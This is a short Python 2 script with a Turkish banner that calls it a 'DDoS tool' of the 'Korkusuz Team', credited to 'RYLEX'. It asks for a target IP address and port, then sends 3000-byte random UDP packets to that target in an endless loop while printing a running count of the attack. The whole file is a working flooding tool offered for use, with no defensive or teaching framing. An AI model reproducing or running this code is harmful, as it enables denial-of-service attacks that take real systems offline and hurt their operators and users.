import socket
import random
import os

os.system("clear")
banner="""
                   Korkusuz Team Ozel Ddos Araci v1.0 
                
                                                  
                  $$  $$    $$    $$    $$$$$$$$   
                  $$ $      $$    $$       $$
                  $$$       $$$$$$$$       $$
                  $$ $      $$    $$       $$
                  $$  $$    $$    $$       $$  

	>CODER BY RYLEX            
"""
print(banner)

Hedef_ip=raw_input("Hedef ip: ")
Hedef_port=input("Hedef port: ")

bytes=random._urandom(3000)
sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)

sayac=0
while True:
	sock.sendto(bytes,(Hedef_ip,Hedef_port))
	sayac=sayac+1
	print("saldiri baslatildi,gonderilen paket:%s"%(sayac))
